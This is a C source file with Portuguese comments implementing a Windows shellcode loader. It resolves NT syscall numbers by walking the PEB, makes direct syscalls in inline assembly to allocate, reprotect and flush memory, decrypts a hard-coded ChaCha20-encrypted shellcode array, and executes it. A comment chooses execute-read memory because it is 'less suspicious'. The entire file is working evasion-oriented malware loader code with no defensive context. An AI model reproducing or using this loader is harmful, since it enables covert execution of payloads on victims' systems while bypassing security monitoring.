#pragma function(memset)
void* memset(void* dest, int c, size_t count) {
    char* bytes = (char*)dest;
    while (count--) {
        *bytes++ = (char)c;
    }
    return dest;
}

void *memcpy(void *dest, const void* src, size_t len) {
    char *d = dest;
    const char *s = src;
    while(len--) {
        *d++ = *s++;
    }
    return dest;
}

int __stdio_common_vsprintf() { return 0; }

#include "./include/peb_walker.h"
#include "./include/chacha20.h"

void* alloc_mem(uint32_t ssn, uint64_t align, uint64_t size, uint64_t type, uint64_t protect) {
    void* base_addr = 0;
    uint64_t region_size = size;
    uint32_t status;

    __asm__ __volatile__ (
        // 1. Preparar os 4 primeiros argumentos nos registros
        "movq %[prochandle], %%rcx\n"
        "movq %[pbaseaddr], %%rdx\n" // Passa o ENDEREÇO da variável
        "movq %[zerobits], %%r8\n"
        "movq %[psize], %%r9\n"      // Passa o ENDEREÇO da variável

        // 2. Alocar espaço na pilha para os argumentos 5 e 6
        // O kernel espera o Arg 5 em [RSP+40] e Arg 6 em [RSP+48] durante a syscall
        "subq $56, %%rsp\n" 
        "movq %[type], 40(%%rsp)\n"    // 5º arg: AllocationType
        "movq %[protect], 48(%%rsp)\n" // 6º arg: Protect

        // 3. Preparar a syscall
        "movq %%rcx, %%r10\n"
        "movl %[ssn], %%eax\n"
        "syscall\n"

        // 4. Limpar a pilha
        "addq $56, %%rsp\n"
        : "=a"(status)
        : [ssn] "r"(ssn),
        [prochandle] "r"((void*)-1),
        [pbaseaddr] "r"(&base_addr),   // NT exige ponteiro
        [zerobits] "r"(align),
        [psize] "r"(&region_size),     // NT exige ponteiro
        [type] "r"(type),            // MEM_COMMIT | MEM_RESERVE
        [protect] "r"(protect)            // PAGE_EXECUTE_READWRITE
        : "rcx","rdx","r8","r9","r10","r11","memory"
    );

    return (status == 0) ? base_addr : 0;
}

uint32_t free_mem(uint32_t ssn, void* address, size_t size, uint32_t free_type) {
    uint32_t status;
    void* base_addr = address;
    uint64_t region_size = size;

    // Se for MEM_RELEASE (0x8000), region_size DEVE ser 0
    if (free_type == 0x8000) {
        region_size = 0;
    }

    __asm__ __volatile__ (
        "subq $40, %%rsp\n"          // 32 bytes (shadow) + 8 bytes (alinhamento)

        "movq %[prochandle], %%r10\n"
        "movq %[pbaseaddr], %%rdx\n" // Passa o ENDEREÇO da variável que contém o ponteiro
        "movq %[psize], %%r8\n"      // Passa o ENDEREÇO da variável de tamanho
        "movl %[freetype], %%r9d\n"

        "movl %[ssn], %%eax\n"
        "syscall\n"

        "addq $40, %%rsp\n"
        : "=a"(status)
        : [ssn] "r"(ssn),
          [prochandle] "r"((void*)-1),
          [pbaseaddr] "r"(&base_addr), 
          [psize] "r"(&region_size),
          [freetype] "r"(free_type)
        : "r10", "rdx", "r8", "r9", "r11", "rcx", "memory"
    );

    return status;
}

uint32_t protect_mem(uint32_t ssn, void* address, size_t size, uint32_t new_protect) {
    uint32_t status;
    uint32_t old_protect = 0;
    void* base_addr = address;
    uint64_t region_size = (uint64_t)size;
    void* old_protect_ptr = (void*)&old_protect;

    __asm__ __volatile__ (
        // Allocate shadow space (32 bytes) + space for 5th argument (8 bytes)
        "subq $40, %%rsp\n"
        
        // Setup arguments in registers
        "movq %[prochandle], %%r10\n"  // Arg 1: Process handle
        "movq %[pbaseaddr], %%rdx\n"   // Arg 2: BaseAddress pointer
        "movq %[psize], %%r8\n"        // Arg 3: RegionSize pointer
        "movl %[newprotect], %%r9d\n"  // Arg 4: NewProtect
        
        // Setup 5th argument (OldProtect pointer) on stack
        "movq %[oldprotect_ptr], 32(%%rsp)\n"
        
        // System call
        "movl %[ssn], %%eax\n"
        "syscall\n"
        
        "addq $40, %%rsp\n"
        : "=a"(status)
        : [ssn] "r"(ssn),
          [prochandle] "r"((void*)-1),
          [pbaseaddr] "r"(&base_addr),
          [psize] "r"(&region_size),
          [newprotect] "r"(new_protect),
          [oldprotect_ptr] "r"(old_protect_ptr)
        : "r10", "rdx", "r8", "r9", "r11", "rcx", "memory"
    );

    return status;
}

uint32_t flush_mem(uint32_t ssn, void* address, size_t size) {
    uint32_t status;

    __asm__ __volatile__ (
        "subq $40, %%rsp\n"          // 32 (shadow) + 8 (alinhamento)

        "movq %[prochandle], %%r10\n" // Arg 1: Handle (-1)
        "movq %[address], %%rdx\n"    // Arg 2: BaseAddress
        "movq %[size], %%r8\n"       // Arg 3: Length

        "movl %[ssn], %%eax\n"
        "syscall\n"

        "addq $40, %%rsp\n"
        : "=a"(status)
        : [ssn] "r"(ssn),
          [prochandle] "r"((void*)-1),
          [address] "r"(address),
          [size] "r"((uint64_t)size)
        : "r10", "rdx", "r8", "r11", "rcx", "memory"
    );

    return status;
}

int main() {
    PEB_Scavenger peb = init_scavenger();
    uint32_t alloc_ssn = get_ssn(peb.NtAllocateVirtualMemory);
    uint32_t free_ssn = get_ssn(peb.NtFreeVirtualMemory);
    uint32_t prot_ssn = get_ssn(peb.NtProtectVirtualMemory);
    uint32_t flush_ssn = get_ssn(peb.NtFlushInstructionCache);

    unsigned char shellcode[] = { 0x76, 0x23, 0x72, 0xA6, 0xFE, 0x29, 0x52, 0x5B, 0x3E, 0xA9, 0x00, 0xC8, 0x4D, 0xC6, 0x24, 0xC7, 0xD4, 0x38, 0x41, 0xE2, 0xBA, 0x76, 0x1B, 0xC5, 0xF1, 0xB3, 0x83, 0xE7, 0xE5, 0x8C, 0xAB, 0x1A, 0xE2, 0x48, 0x2D, 0x42, 0x6B, 0x08, 0xB1, 0xC2, 0xA7, 0x0F, 0xD9, 0x9D, 0x16, 0x5A, 0xFC, 0xF6, 0xD0, 0x02, 0x1A, 0x78, 0x59, 0x88, 0x9D, 0xBD, 0xEC, 0x2F, 0xB9, 0x9C, 0xA2, 0xE1, 0x18, 0x2B, 0xB5, 0xB3, 0x81, 0x94, 0x7D, 0x0D, 0xAE, 0x3F, 0x57, 0xF8, 0x84, 0x28, 0xA7, 0xC3, 0x94, 0x9D, 0x71, 0xAA, 0xC0, 0x08, 0xC9, 0x45, 0x71, 0x56, 0x65, 0x88, 0xB9, 0x22, 0xDE, 0x8B, 0xDE, 0x8C, 0x19, 0x08, 0xBB, 0x7C, 0xDD, 0x6B, 0x4B, 0xE1, 0x5A, 0xDB, 0x9C, 0xF7, 0x3A, 0x5A, 0x53, 0x3D, 0x6E, 0x35, 0x28, 0x35, 0x87, 0xB9, 0xEC, 0x77, 0x64, 0xCE, 0xDC, 0x3E, 0xF8, 0xCC, 0xCD, 0xA3, 0x57, 0xCC, 0x69, 0x07, 0xC3, 0x8C, 0x96, 0xDA, 0xE4, 0x66, 0xA3, 0xB4, 0xFD, 0x0F, 0xF0, 0xCF, 0x4C, 0x52, 0x6A, 0x99, 0x75, 0xFF, 0xD3, 0x9C, 0xC7, 0x86, 0x40, 0xF2, 0xF9, 0xB6, 0x7C, 0xB2, 0x93, 0xFA, 0xCD, 0xA6, 0x39, 0xF0, 0x55, 0xA2, 0x7B, 0xF5, 0x17, 0xE5, 0x2F, 0x17, 0x90, 0x5E, 0x9E, 0x2D, 0x6B, 0xEA, 0x30, 0xCB, 0x65, 0x90, 0xE9, 0x48, 0x3F, 0x85, 0x12, 0xA7, 0x26, 0x45, 0xFA, 0xE5, 0x1F, 0xAF, 0x01, 0x08, 0x81, 0x9B, 0x04, 0xA5, 0x09, 0x2A, 0xAE, 0xA3, 0x78, 0x76, 0x4F, 0xD8, 0xE6, 0x5B, 0x39, 0xE6, 0x0A, 0x6D, 0xAD, 0xE2, 0xCB, 0xA7, 0x5A, 0x60, 0x45, 0xA0, 0x3F, 0xCB, 0x61, 0x82, 0xED, 0x86, 0xA7, 0xAD, 0xA9, 0xCE, 0xA8, 0xBB, 0x70, 0xB2, 0x1F, 0x56, 0x87, 0x3A, 0xAF, 0xD7, 0xC8, 0xC3, 0xCA, 0xA1, 0x6B, 0x06, 0x01, 0x0F, 0x0F, 0x5B, 0x08, 0xDC, 0x01, 0x22, 0x4C, 0x91, 0x60, 0xDB, 0x13, 0xA4, 0xD7, 0x51, 0xC3, 0x5B, 0xCF, 0xB7, 0x36, 0x2D, 0xAE, 0xEF, 0x82, 0x24, 0x8E, 0xA6, 0x78, 0xBE, 0x66, 0x86, 0xBF, 0x7E, 0x2D, 0x01, 0x18, 0x9C, 0x25, 0x47, 0x9E, 0x70, 0xF2, 0x3B, 0xD9, 0x8A, 0x79, 0x02, 0x04, 0x80, 0xC8, 0x2F, 0x74, 0x03, 0x99, 0xF5, 0x25, 0x37, 0x6E, 0x1E, 0x49, 0xB2, 0xE9, 0x42, 0xE6, 0x14, 0x52, 0x81, 0x1A, 0xED, 0xD3, 0xD1, 0xD0, 0x2D, 0xBC, 0x66, 0x24, 0xF7, 0x87, 0xE7, 0xF6, 0x7A, 0x4C, 0x45, 0x73, 0x2A, 0x44, 0x9A, 0xF1, 0x5C, 0x65, 0x4E, 0x3C, 0xEB, 0x17, 0x90, 0xC6, 0xF7, 0x7E, 0x57  };

    void* buffer = alloc_mem(alloc_ssn, 0, sizeof(shellcode), 0x3000 , 0x04);

    uint32_t key[8] = { 4082983619, 3889329055, 2378976225, 3595600982, 2858304340, 67682415, 1356556552, 2242286600 };
    uint32_t nonce[3] = { 1401676596, 2241564051, 2000661102 };

    ChaCha20 c = new_chacha(key, nonce);

    process_chacha20(&c, shellcode, sizeof(shellcode));

    size_t sc_size = sizeof(shellcode);

    if (buffer) {
        // 3. Copiar shellcode para o buffer
        // Se não quiser usar a ntdll!memcpy, pode usar um loop for simples
        for (int i = 0; i < sc_size; i++) {
            ((unsigned char*)buffer)[i] = shellcode[i];
        }

        // 4. Alterar proteção para Execute/Read (0x20)
        // O kernel exige RX para rodar código (ou RWX, mas RX é menos suspeito)
        uint32_t status_prot = protect_mem(prot_ssn, buffer, sc_size, 0x20);

        flush_mem(flush_ssn, buffer, sc_size);

        if (status_prot == 0) {
            // 5. Executar o shellcode
            void (*run_sc)() = (void (*)())buffer;
            run_sc(); 
        }

        // 6. Liberar a memória após o retorno do shellcode (se ele retornar)
        free_mem(free_ssn, buffer, 0, 0x8000);
    }

    return 0;
}
